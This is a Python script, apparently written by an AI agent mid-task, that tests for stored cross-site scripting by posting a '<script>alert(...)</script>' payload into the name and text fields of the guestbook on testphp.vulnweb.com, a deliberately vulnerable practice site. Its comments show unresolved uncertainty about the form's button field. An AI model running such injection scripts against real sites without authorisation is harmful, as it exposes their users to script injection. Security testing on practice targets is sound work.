import requests

url = 'http://testphp.vulnweb.com/guestbook.php'
payload = "<script>alert('XSS_TEST')</script>"
safe = "test_user"

def test_submission(name_val, text_val, desc):
    print(f"\n--- Testing: {desc} ---")
    data = {
        'name': name_val,
        'text': text_val,
        'btnSign': 'Sign Guestbook' # I need to check the actual button name from previous output or guess it. 
        # The previous output showed 'submit' value='add' or something.
        # Let's try to be generic or check the form again.
        # Actually, let's just use what I saw: 'submit' value 'add' might be it?
        # Or maybe I should just get the form first.
    }
    # Based on common knowledge of testphp.vulnweb.com, the button is 'btnSign' or just 'add'.
    # Let's try to fetch the form first to be sure of the button name.
    
    try:
        # Simple POST
        resp = requests.post(url, data=data)
        if payload in resp.text:
            print("  Result: Reflected in response!")
        
        # Check if stored
        resp2 = requests.get(url)
        if payload in resp2.text:
            print("  Result: STORED SUCCESS!")
        else:
            print("  Result: Not stored.")
            
    except Exception as e:
        print(f"  Error: {e}")

# I need the button name.
# Let's assume 'btnSign' for now, or I'll check the output of the previous tool again.
# The previous tool output was: <input name="submit" value="go"> (search) and <input type="submit" name="submit" value="add"> (guestbook?)
# Wait, if both have name="submit", that's confusing.
# Let's try sending 'submit': 'add'

print("Starting tests...")

# Test 1: Payload in text only
test_submission(safe, payload, "Payload in 'text' only")

# Test 2: Payload in name only
test_submission(payload, safe, "Payload in 'name' only")

# Test 3: Payload in both
test_submission(payload, payload, "Payload in BOTH")
